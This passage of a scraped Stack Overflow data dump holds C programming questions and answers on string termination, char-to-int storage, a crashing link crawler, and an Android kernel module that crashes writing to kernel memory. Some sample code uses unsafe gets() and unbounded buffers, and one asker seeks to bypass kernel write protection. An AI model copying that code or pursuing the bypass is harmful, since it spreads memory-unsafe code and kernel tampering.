index. </p></li>\n</ol>\n\n<p>In writing operation we are just setting the flag never reset it again.</p>\n\n<pre><code>status_flag [i] = true;\n</code></pre>\n\n<p>In reading operation we are doing something like that :</p>\n\n<pre><code>    for(;;){  //spinning to get flag true\n       if(status_flag [i] == true){\n           //do_something ;\n           break;\n       }\n    }\n</code></pre>\n\n<p>What happen if compiler optimize (branch prediction) code? </p>\n\n<p>I have read lot about lock but still having confusion to conclude result. Please help me to conclude.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 2, "creation_date": 1437547329, "post_id": 31555676, "comment_id": 51068443, "body": "<code>gets()</code> is <b>evil</b>, use <code>fgets()</code> instead."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1437547995, "post_id": 31555676, "comment_id": 51068778, "body": "You should format your code correctly and use meaningful variable names instead of b,e, a etc."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437633334, "post_id": 31555676, "comment_id": 51113141, "body": "for readability by us humans, it is much better to surround each expression in a compound &#39;if&#39; statement with parens.   Also, using parens assures the proper order of evaluation is performed.  Few of us know all the details of the precedence of the C operators, using parens makes it clear what is to be grouped together."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1437633472, "post_id": 31555676, "comment_id": 51113212, "body": "Since the posted code is not commented and the variable names are meaningless, most (including me) will not bother to try and reverse engineer the code to try and determine what the posted code is trying to accomplish."}], "answers": [{"tags": [], "owner": {"reputation": 347, "user_id": 5122214, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2bc1e08af082a59786967aa584c3671b?s=128&d=identicon&r=PG&f=1", "display_name": "Chaka", "link": "https://stackoverflow.com/users/5122214/chaka"}, "is_accepted": false, "score": 1, "last_activity_date": 1437547901, "last_edit_date": 1437547901, "creation_date": 1437547757, "answer_id": 31555810, "question_id": 31555676, "link": "https://stackoverflow.com/questions/31555676/extra-character-at-the-end-of-a-string-in-the-following-program/31555810#31555810", "title": "Extra character at the end of a string in the following program?", "body": "<p>you may modify your code to :</p>\n\n<pre><code>    ....        \n    }\n    e[i] = '\\0';   //&lt;-- with space i crashed here, with that i get 'get the wookies I will'\n    strcat(b, e);\n    printf(\"%s\", b);\n    return 0;\n}\n</code></pre>\n\n<p>strings end with \\0\nwithout the \\0 a stringfunction will read until the 1st \\0\neven if it is not your string memory.</p>\n"}, {"comments": [{"owner": {"reputation": 347, "user_id": 5122214, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2bc1e08af082a59786967aa584c3671b?s=128&d=identicon&r=PG&f=1", "display_name": "Chaka", "link": "https://stackoverflow.com/users/5122214/chaka"}, "edited": false, "score": 0, "creation_date": 1437547933, "post_id": 31555853, "comment_id": 51068747, "body": "i+1 would lead to : &#39;get the wookies I will &#39; instead of &#39;get the wookies I will&#39;. e is the end, so the space makes no sense"}], "tags": [], "owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "is_accepted": false, "score": 0, "last_activity_date": 1437547938, "last_edit_date": 1437547938, "creation_date": 1437547896, "answer_id": 31555853, "question_id": 31555676, "link": "https://stackoverflow.com/questions/31555676/extra-character-at-the-end-of-a-string-in-the-following-program/31555853#31555853", "title": "Extra character at the end of a string in the following program?", "body": "<p>You have undefined behaviour here because you are missing a NUL terminator in the <code>e</code> string that is to be appended to the string <code>b</code>.</p>\n\n<p>On my computer the program actually crashed.</p>\n\n<pre><code>for(i=1;i&lt;=c;i++)\n{\n  e[i]=a[i-1];\n}\n\ne[i] = ' ';\ne[i+1] = 0;   // &lt;&lt;&lt;&lt; add this line in your code\nstrcat(b,e);\nprintf(\"%s\",b);\nreturn 0;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1247, "user_id": 4349429, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/747aac0b54af7691075ba3758a66ca4a?s=128&d=identicon&r=PG&f=1", "display_name": "Pawan", "link": "https://stackoverflow.com/users/4349429/pawan"}, "is_accepted": false, "score": 2, "last_activity_date": 1437572994, "last_edit_date": 1437572994, "creation_date": 1437548045, "answer_id": 31555912, "question_id": 31555676, "link": "https://stackoverflow.com/questions/31555676/extra-character-at-the-end-of-a-string-in-the-following-program/31555912#31555912", "title": "Extra character at the end of a string in the following program?", "body": "<p>I tested this and your code worked fine in my system. This could be mainly, because you are not initializing character arrays <code>a,b,e</code> in your code and they might contain junk values. After initializing them to '0', things don't behave weirdly.<br>Additionally, you don't need an extra space in 'e[i]' call just before <code>strcat</code> as shown in below program.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main()\n{\n  //char a[100]={0},b[100]={0},e[100]={0};\n  char a[100]={0},b[100]={0},e[100]={0};\n  int c=0,i,k=0,j=0;\n\n  gets(a);\n  for(i =0;i&lt;=strlen(a);i++)\n  {\n    if (a[i] == ' '&amp;&amp; j&lt;2)\n    {\n      c=i;\n      j++;\n    }\n  }\n  for(i=c+1;i&lt;=strlen(a);i++)\n  {\n    b[k]=a[i];\n    k++;\n  }\n  e[0]=' ';\n  for(i=1;i&lt;=c;i++)\n  {\n    e[i]=a[i-1];\n  }\n  //e[i]=' ';\n  strcat(b,e);\n  printf(\"[%s]\\n\",b);\n  return 0;\n}\n</code></pre>\n\n<p><em>Moreover, from a secure/better programming perspective, it is always good to initialize variables while declaring them. This way we can be sure what value(s) variable contains rather then relying on OS for this.</em></p>\n"}, {"tags": [], "owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "is_accepted": false, "score": 0, "last_activity_date": 1438603554, "last_edit_date": 1438603554, "creation_date": 1437633822, "answer_id": 31579941, "question_id": 31555676, "link": "https://stackoverflow.com/questions/31555676/extra-character-at-the-end-of-a-string-in-the-following-program/31579941#31579941", "title": "Extra character at the end of a string in the following program?", "body": "<p>This line: <code>e[i]= ' ';</code> fails to properly terminate the string of characters in <code>e</code>,  </p>\n\n<p>so when <code>printf()</code> is called, more characters are printed until a <code>\\0</code> is encountered.   </p>\n\n<p>In general, this lack of a proper string termination character results in undefined behaviour which can lead to a segmentation fault event.  </p>\n\n<p>The symptom of this problem is the extra printed character.</p>\n\n<p>There are probably other extra characters, which were not printable before a <code>\\0</code> was encountered in memory.</p>\n"}], "owner": {"reputation": 37, "user_id": 5136019, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-wpAxrMDvmMk/AAAAAAAAAAI/AAAAAAAAAG0/lznGtDYeykc/photo.jpg?sz=128", "display_name": "abhi", "link": "https://stackoverflow.com/users/5136019/abhi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 145, "favorite_count": 0, "answer_count": 4, "score": -1, "last_activity_date": 1438603554, "creation_date": 1437547269, "last_edit_date": 1437572941, "question_id": 31555676, "link": "https://stackoverflow.com/questions/31555676/extra-character-at-the-end-of-a-string-in-the-following-program", "title": "Extra character at the end of a string in the following program?", "body": "<p>This program is to take the first two words in the sentence and place them at the end and input and output as a single string. </p>\n\n<p>But I am getting extra '^' at the end.</p>\n\n<p>Input:</p>\n\n<blockquote>\n  <p>I will go now to find the Wookiee</p>\n</blockquote>\n\n<p>Expected Output:</p>\n\n<blockquote>\n  <p>go now to find the Wookiee I will</p>\n</blockquote>\n\n<p>Obtained Output:</p>\n\n<blockquote>\n  <p>go now to find the Wookiee I will \u0302</p>\n</blockquote>\n\n<pre class=\"lang-c prettyprint-override\"><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    char a[100], b[100], e[100];\n    int c = 0, i, k = 0, j = 0;\n\n    gets(a);\n    for(i = 0; i &lt;= strlen(a); i++)\n    {\n        if (a[i] == ' ' &amp;&amp; j &lt; 2)\n        {\n            c = i;\n            j++;\n        }\n    }\n\n    for(i = c + 1; i &lt;= strlen(a); i++)\n    {\n        b[k] = a[i];\n        k++;\n    }\n\n    e[0] = ' ';\n\n    for(i = 1; i &lt;= c; i++)\n    {\n        e[i] = a[i - 1];\n    }\n\n    e[i]= ' ';\n    strcat(b, e);\n    printf(\"%s\", b);\n\n    return 0;\n}\n</code></pre>\n\n<blockquote>\n  <p>INPUT: to the people of india<br>\n  OUTPUT: people of india to the \u0302</p>\n</blockquote>\n"}, {"tags": ["c", "arrays", "char", "int"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 5, "creation_date": 1437545187, "post_id": 31555084, "comment_id": 51067451, "body": "<code>fflush(stdin);</code>--- undefined behaviour."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 4, "creation_date": 1437545225, "post_id": 31555084, "comment_id": 51067461, "body": "[FYR] <code>gets()</code> is <b>evil</b>, use <code>fgets()</code>."}, {"owner": {"reputation": 27303, "user_id": 1003123, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ef598363853c3081cc13585afbe81d0f?s=128&d=identicon&r=PG", "display_name": "enrico.bacis", "link": "https://stackoverflow.com/users/1003123/enrico-bacis"}, "edited": false, "score": 4, "creation_date": 1437545668, "post_id": 31555084, "comment_id": 51067659, "body": "&quot;I know using gets is unsafe, but that&#39;s what the teacher asked so I have to.&quot; -- <i>Always question the teachers, they may discover new things</i>"}, {"owner": {"reputation": 447, "user_id": 3513509, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7d3550221670bd84e6d10fb63f1ef74d?s=128&d=identicon&r=PG&f=1", "display_name": "KillaBytes", "link": "https://stackoverflow.com/users/3513509/killabytes"}, "edited": false, "score": 4, "creation_date": 1437545740, "post_id": 31555084, "comment_id": 51067690, "body": "Tell your teacher to join SO..."}], "answers": [{"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": true, "score": 2, "last_activity_date": 1437546269, "last_edit_date": 1437546269, "creation_date": 1437545852, "answer_id": 31555303, "question_id": 31555084, "link": "https://stackoverflow.com/questions/31555084/convert-a-char-type-stored-in-an-array-to-an-int-variable/31555303#31555303", "title": "Convert a char type stored in an array to an int variable", "body": "<p>Your problem statement is not very clear, but as of now, a generic way to achieve what you want is to</p>\n\n<ol>\n<li>Take the input from user for \"How many days will the guest stay?\" using <code>fgets()</code>.</li>\n<li>Convert the <em>string</em> input to <code>int</code> by using <a href=\"http://linux.die.net/man/3/strtol\" rel=\"nofollow\"><code>strtol()</code></a> and store in a temporary <code>int</code> variable.</li>\n<li>Multiply that value with your global <code>char</code>.</li>\n<li><em>Print</em> the result to <code>database[room_ID+4]</code> using <a href=\"http://linux.die.net/man/3/snprintf\" rel=\"nofollow\"><code>snprintf()</code></a>.</li>\n</ol>\n"}], "owner": {"reputation": 23, "user_id": 5142048, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9558552a459f7e1c2b8ec87bb94f6ff3?s=128&d=identicon&r=PG&f=1", "display_name": "Johann Strauss", "link": "https://stackoverflow.com/users/5142048/johann-strauss"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 108, "favorite_count": 0, "accepted_answer_id": 31555303, "answer_count": 1, "score": 2, "last_activity_date": 1437547981, "creation_date": 1437545154, "last_edit_date": 1437547981, "question_id": 31555084, "link": "https://stackoverflow.com/questions/31555084/convert-a-char-type-stored-in-an-array-to-an-int-variable", "title": "Convert a char type stored in an array to an int variable", "body": "<p>I'm currently working on a project and I need to do something very specific. I need to store a value in a <code>database</code> of sorts using a char array, but I also need to store the value of a multiplication in the last slot of it and I have no idea how to do this. Casting the char variable and multiplying it seems to store garbage on the <code>int</code> as I get values way off the range it should be. Another suggestion I tried was using <code>memset()</code> to manually set the value but I don't quite know how to go about that.</p>\n\n<p>Here's my code</p>\n\n<pre><code>int form_fill(int room_ID, char database[rooms * floors * req_data][20]) {\n    printf (\"Enter the first name\\n\");\n    fflush(stdin);\n    gets (database[room_ID]);\n    printf (\"Enter the second name\\n\");\n    gets (database[room_ID + 1]);\n    printf (\"Enter the third name\\n\");\n    gets (database[room_ID + 2]);\n    printf (\"How many days will the guest stay?\\n\");\n}\n</code></pre>\n\n<p>Ideally the days the user inputs will be stored in <code>database[room_ID + 3]</code> as a <code>char</code> and multiplied by another variable declared earlier as global and the result stored, as a <code>char</code>, in <code>database[room_ID + 4]</code>.\nAnyone got any solutions for this? </p>\n\n<p>ps. I know using gets is unsafe, but that's what the teacher asked so I have to. </p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 3, "creation_date": 1437544822, "post_id": 31554971, "comment_id": 51067276, "body": "Hi There. Why don&#39;t you check it with a debugger first? LIke <code>gdb</code>."}, {"owner": {"reputation": 27279, "user_id": 857132, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4fd51ed5980999c7c6ce3729d6cb2184?s=128&d=identicon&r=PG", "display_name": "John3136", "link": "https://stackoverflow.com/users/857132/john3136"}, "edited": false, "score": 1, "creation_date": 1437544911, "post_id": 31554971, "comment_id": 51067318, "body": "If you aren&#39;t going to use a debugger: &quot;divide and conquer&quot; - add some prints to narrow down the crash. I can see at least 3 places where a NULL check should be added..."}, {"owner": {"reputation": 1, "user_id": 4377826, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-kFzpVYJMxVc/AAAAAAAAAAI/AAAAAAAAAB0/HM_gfE_kAng/photo.jpg?sz=128", "display_name": "Venkat Bharath", "link": "https://stackoverflow.com/users/4377826/venkat-bharath"}, "edited": false, "score": 0, "creation_date": 1437549441, "post_id": 31554971, "comment_id": 51069577, "body": "where i have to add null ?"}, {"owner": {"reputation": 1, "user_id": 4377826, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-kFzpVYJMxVc/AAAAAAAAAAI/AAAAAAAAAB0/HM_gfE_kAng/photo.jpg?sz=128", "display_name": "Venkat Bharath", "link": "https://stackoverflow.com/users/4377826/venkat-bharath"}, "edited": false, "score": 0, "creation_date": 1437567463, "post_id": 31554971, "comment_id": 51081415, "body": "thank you john3136 ... my code is now working :)"}], "answers": [{"tags": [], "owner": {"reputation": 347, "user_id": 5122214, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2bc1e08af082a59786967aa584c3671b?s=128&d=identicon&r=PG&f=1", "display_name": "Chaka", "link": "https://stackoverflow.com/users/5122214/chaka"}, "is_accepted": true, "score": -1, "last_activity_date": 1437545273, "creation_date": 1437545273, "answer_id": 31555113, "question_id": 31554971, "link": "https://stackoverflow.com/questions/31554971/im-getting-segmentation-faultcore-dumped-when-i-execute-this-code/31555113#31555113", "title": "i&#39;m getting segmentation fault(core dumped) when i execute this code...", "body": "<p>if your file is greater than 100.000 you will write over :</p>\n\n<pre><code>a = (char *)malloc(sizeof(char)* 100000);   &lt;--\n    for (i = 0; (c = fgetc(fp)) != EOF; i++){\n        a[i] = c;\n    }\n</code></pre>\n\n<p>you should use file size perhaps </p>\n"}], "owner": {"reputation": 1, "user_id": 4377826, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-kFzpVYJMxVc/AAAAAAAAAAI/AAAAAAAAAB0/HM_gfE_kAng/photo.jpg?sz=128", "display_name": "Venkat Bharath", "link": "https://stackoverflow.com/users/4377826/venkat-bharath"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 48, "favorite_count": 0, "closed_date": 1437552130, "accepted_answer_id": 31555113, "answer_count": 1, "score": -8, "last_activity_date": 1437545273, "creation_date": 1437544708, "question_id": 31554971, "link": "https://stackoverflow.com/questions/31554971/im-getting-segmentation-faultcore-dumped-when-i-execute-this-code", "closed_reason": "Not suitable for this site", "title": "i&#39;m getting segmentation fault(core dumped) when i execute this code...", "body": "<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n#include&lt;stdlib.h&gt;\nchar* get_page(char *s)\n{\nFILE *fp = fopen(s,\"r\");\n    if(fp==NULL){\n        printf(\"file not found\\n\");\n    }else{\n        char c;\n        char *a;\n        int y,i;\n        a=(char *) malloc(sizeof(char)*100000);\n        for(i=0;(c=fgetc(fp))!=EOF;i++){\n            a[i]=c;\n        }\n        a[i+1]='\\0';\n        fclose(fp);\n        return a;\n    }\n}\nchar** get_all_links(char *b)\n{\n    //printf(\"%s\",b);\n    int u,i=0,j=0,t,z;\n    char **f;\n    f=(char **) malloc(sizeof(char *)*100);\n    u=strlen(b);\n    for(t=0;t&lt;u;t++){\n            if(b[t]=='&lt;' &amp;&amp; (b[t+1]=='A' || b[t+1]=='a')){\n                f[j]=(char *) malloc(sizeof(char)*10000);\n                for(z=t+9;b[z]!='\"';z++){\n                    f[j][i++]=b[z];\n                }\n                i=0;\n                j++;\n            }\n    }\n    printf(\"%d\\n\",j);\n    if(j==0){\n        f[0]=NULL;\n    }else{\n        f[j+1]=NULL;\n    }\n    return f;\n}\nint main(){\n    char f[100],*p,*l,*w,**k,**links;\n    scanf(\"%s\",f);\n    int loop_count=0,ii,prev_links=0,check=0,get_link=1,o,u;\n    k=NULL;\n    while(f!=NULL){\n        //printf(\"in while 1\\n\");\n    printf(\"%s\\n\",f);\n    p=get_page(f);\n    //printf(\"%s\",p);\n    if(k!=NULL)\n        free(k);\n    k=get_all_links(p);\n    //printf(\"\\n\");\n    int count_for_links=0,x=0;\n    while(k[x]!=NULL){\n        //printf(\"in while\\n\");\n        count_for_links++;\n        x++;\n    }\n    printf(\"%d\\n\",count_for_links);\n    prev_links=prev_links+count_for_links;\n    if(loop_count==0){\n        //printf(\"in loop count ==0\\n\");\n    links=(char **) malloc(sizeof(char *)*(count_for_links+1));\n    links[0]=(char *) malloc(sizeof(char)*strlen(f));\n    strcpy(links[0],f);\n    //printf(\"%s\\n\",links[0]);\n    for(ii=0;ii&lt;count_for_links;ii++){\n        //printf(\"in for ii&lt;count_for_links\\n\");\n        links[ii+1]=(char *) malloc(sizeof(char)*strlen(k[ii]));\n        strcpy(links[ii+1],k[ii]);\n        printf(\"%s\\n\",links[ii+1]);\n    }\n    }else if(loop_count&gt;0){\n        //printf(\"%s\\n\",k[0] );\n        for(o=0;(k[o]!=NULL &amp;&amp; o&lt;count_for_links);o++){\n            printf(\"%s\",k[o]);\n            //printf(\"check extra %d\\n\",loop_count);\n            for(u=0;u&lt;=ii;u++){\n                if(strcmp(k[o],links[u])==1){\n                    check=1;\n                    printf(\"the war\");\n                }\n            }\n\n            if(check==0){\n            //  printf(\"in link not found\\n\");\n                links =(char **) realloc(links,(sizeof(char *)));\n                links[ii+1]=(char *) malloc(sizeof(char)*strlen(k[o]));\n                ii++;\n                strcpy(links[ii],k[o]);\n            }   \n        }\n    }\n    printf(\"OUT\");\n    strcpy(f,links[get_link]);\n    get_link++;\n    loop_count++;\n}\nint q;\nprintf(\"helloooooo\");\nfor(q=0;links[q]!=NULL;q++){\nprintf(\"%s\",links[q]);\n}\n    return 0;\n}\n</code></pre>\n\n<p>/*here in this code the k array represents the links that i get from a html and for first time it stores in links array and from next time it checks other page and if links are same it omits the same links and takes the other links into the array */</p>\n"}, {"tags": ["android", "c", "memory", "linux-kernel", "panic"], "comments": [{"owner": {"reputation": 533, "user_id": 2581243, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/GUpOH.jpg?s=128&g=1", "display_name": "vishnumotghare", "link": "https://stackoverflow.com/users/2581243/vishnumotghare"}, "edited": false, "score": 0, "creation_date": 1437562004, "post_id": 31554937, "comment_id": 51077685, "body": "Is 0x12345678  valid physical address? From where did you get this address?"}, {"owner": {"reputation": 3561, "user_id": 1149797, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/cVBtb.png?s=128&g=1", "display_name": "Alex Hoppus", "link": "https://stackoverflow.com/users/1149797/alex-hoppus"}, "edited": false, "score": 0, "creation_date": 1437570421, "post_id": 31554937, "comment_id": 51083639, "body": "memory protection is implemented in hardware MMU (MPU), but not in Android system ... actually what are you doing is correct only if 0x12345678 belongs to lowmem part of memory. In other way you will get what you have. What are you trying to achieve?"}, {"owner": {"reputation": 391, "user_id": 1164615, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/20e78432a7b59e12783b4496f2d7bf2c?s=128&d=identicon&r=PG", "display_name": "csharpnewbie", "link": "https://stackoverflow.com/users/1164615/csharpnewbie"}, "edited": false, "score": 0, "creation_date": 1437613428, "post_id": 31554937, "comment_id": 51107584, "body": "sorry, i used 0x12345678 as an example, I get the addresses from /proc/kallsyms, and i translate it to a physical address. For example, if it&#39;s 0xc01c1d50, I will need to subtract 0xc0008000 from it, and since the kernel itself has a starting offset of 0x00008000, I will add it to the result, and hence it will be 0x001C1D50. I am able to read from the address, but writing to it causes an error to occur: Unable to handle kernel paging request at virtual address c01c1d50."}, {"owner": {"reputation": 3852, "user_id": 1607832, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cf6963d2f289cbf78d9c0ece6920188?s=128&d=identicon&r=PG", "display_name": "missimer", "link": "https://stackoverflow.com/users/1607832/missimer"}, "edited": false, "score": 0, "creation_date": 1437619847, "post_id": 31554937, "comment_id": 51109071, "body": "Your question is really two questions, it would be beneficial to make each post one question."}, {"owner": {"reputation": 3852, "user_id": 1607832, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cf6963d2f289cbf78d9c0ece6920188?s=128&d=identicon&r=PG", "display_name": "missimer", "link": "https://stackoverflow.com/users/1607832/missimer"}, "edited": false, "score": 0, "creation_date": 1437620057, "post_id": 31554937, "comment_id": 51109108, "body": "@csharpnewbie Why are you determining the virtual address from <code>proc&#47;kallsyms</code> manually calculating the physical address and then using <code>phys_to_virt</code> to go back to the virtual address?  Or am I missing something?"}, {"owner": {"reputation": 3852, "user_id": 1607832, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cf6963d2f289cbf78d9c0ece6920188?s=128&d=identicon&r=PG", "display_name": "missimer", "link": "https://stackoverflow.com/users/1607832/missimer"}, "edited": false, "score": 0, "creation_date": 1437620285, "post_id": 31554937, "comment_id": 51109151, "body": "@csharpnewbie I have updated my answer to address your first question.  With regards to the second: &quot;The same thing happens when I inserted the kernel module with the above code, the kernel generates a panic(oops), and then it restarts the phone. The last_kmsg logged is around the same as the one I provided above.&quot;  This is very unclear, you need to provide more details.  What do you mean as &quot;around the same one&quot; could you please provide the exact error message."}, {"owner": {"reputation": 391, "user_id": 1164615, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/20e78432a7b59e12783b4496f2d7bf2c?s=128&d=identicon&r=PG", "display_name": "csharpnewbie", "link": "https://stackoverflow.com/users/1164615/csharpnewbie"}, "edited": false, "score": 0, "creation_date": 1437621629, "post_id": 31554937, "comment_id": 51109465, "body": "pardon me, this is the process I used for previous phones, because I am using a Galaxy S5, and the kernel is mapped at offset 0x00008000 for this phone, while previously, it was mapped at offset 0x80208000, etc. You can ignore the part where I manually calculate the physical address and then going back to the virtual address. The address I obtained is confirmed working as I am able to read from the address, which holds the same value when I compared to that within the uncompressed kernel I extracted from the phone itself."}], "answers": [{"comments": [{"owner": {"reputation": 391, "user_id": 1164615, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/20e78432a7b59e12783b4496f2d7bf2c?s=128&d=identicon&r=PG", "display_name": "csharpnewbie", "link": "https://stackoverflow.com/users/1164615/csharpnewbie"}, "edited": false, "score": 0, "creation_date": 1437613555, "post_id": 31564654, "comment_id": 51107611, "body": "hi, sorry for the confusion in my post, I have edited it to use an appropriate address, and the address I got is from /proc/kallsyms, and I did some calculations to get the actual physical address."}, {"owner": {"reputation": 391, "user_id": 1164615, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/20e78432a7b59e12783b4496f2d7bf2c?s=128&d=identicon&r=PG", "display_name": "csharpnewbie", "link": "https://stackoverflow.com/users/1164615/csharpnewbie"}, "edited": false, "score": 0, "creation_date": 1437621811, "post_id": 31564654, "comment_id": 51109504, "body": "thank you esm, but can I ask if there are any way to bypass the write protection done by the MMU data structures? I tried to do a page walk as described in the original post and then setting the pte obtained to be write enabled, but apparently it doesn&#39;t work as expected, and the kernel still dies and restart."}, {"owner": {"reputation": 3852, "user_id": 1607832, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cf6963d2f289cbf78d9c0ece6920188?s=128&d=identicon&r=PG", "display_name": "missimer", "link": "https://stackoverflow.com/users/1607832/missimer"}, "reply_to_user": {"reputation": 391, "user_id": 1164615, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/20e78432a7b59e12783b4496f2d7bf2c?s=128&d=identicon&r=PG", "display_name": "csharpnewbie", "link": "https://stackoverflow.com/users/1164615/csharpnewbie"}, "edited": false, "score": 0, "creation_date": 1437622233, "post_id": 31564654, "comment_id": 51109600, "body": "@csharpnewbie your best bet is probably to ask another question, posting the code you have already tried."}, {"owner": {"reputation": 391, "user_id": 1164615, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/20e78432a7b59e12783b4496f2d7bf2c?s=128&d=identicon&r=PG", "display_name": "csharpnewbie", "link": "https://stackoverflow.com/users/1164615/csharpnewbie"}, "edited": false, "score": 0, "creation_date": 1437656579, "post_id": 31564654, "comment_id": 51128063, "body": "if I post the code as another question, won&#39;t it be considered double posting? will it be allowed?"}], "tags": [], "owner": {"reputation": 3852, "user_id": 1607832, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cf6963d2f289cbf78d9c0ece6920188?s=128&d=identicon&r=PG", "display_name": "missimer", "link": "https://stackoverflow.com/users/1607832/missimer"}, "is_accepted": false, "score": 2, "last_activity_date": 1437620192, "last_edit_date": 1437620192, "creation_date": 1437571905, "answer_id": 31564654, "question_id": 31554937, "link": "https://stackoverflow.com/questions/31554937/memory-write-with-kernel-module-causes-kernel-oops-in-android-kernel/31564654#31564654", "title": "Memory write with kernel module causes kernel oops in Android kernel", "body": "<p>The virtual to physical mapping is controlled by hardware.  The hardware, specifically the memory management unit (MMU) needs to be programmed to understand what the virtual to physical mapping is.  Furthermore <code>phys_to_virt</code> does not set up any virtual to physical mapping using the MMU.  In fact depending on the architecture it is just doing a simple calculation:</p>\n\n<pre><code>#define __phys_to_virt(x)       ((unsigned long)((x) - PHYS_OFFSET + PAGE_OFFSET))\n\nstatic inline void *phys_to_virt(phys_addr_t x)\n{\n    return (void *)(__phys_to_virt(x));\n}\n</code></pre>\n\n<p>This is taken from the <a href=\"http://lxr.free-electrons.com/source/arch/arm64/include/asm/memory.h#L81\" rel=\"nofollow\">ARM64 Linux kernel</a>.  I am assuming ARM64 since we are talking about Android but the general idea applies for x86 and ARM 32 bit.</p>\n\n<p>This simple offset calculation works because <code>phys_to_virt</code> only works when passed a physical address in the kernel mapping.  Taken from <a href=\"https://www.kernel.org/doc/htmldocs/deviceiobook/API-phys-to-virt.html\" rel=\"nofollow\">this Linux doc</a>:</p>\n\n<blockquote>\n  <p>The returned virtual address is a current CPU mapping for the memory\n  address given. It is only valid to use this function on addresses that\n  have a kernel mapping</p>\n  \n  <p>This function does not handle bus mappings for DMA transfers. In\n  almost all conceivable cases a device driver should not be using this\n  function</p>\n</blockquote>\n\n<p>So to summarize, you cannot pass in any random value for the physical address and expect <code>phys_to_virt</code> to work.</p>\n\n<p>Update based on question update and comments:</p>\n\n<p>If you are able to read from a memory location but not write to it then most likely it has been marked as read only using the MMU data structures.  Some internet searching reveals that there are some patches and proposals to make the text and read only sections of the ARM Linux kernel read only.</p>\n"}], "owner": {"reputation": 391, "user_id": 1164615, "user_type": "registered", "accept_rate": 56, "profile_image": 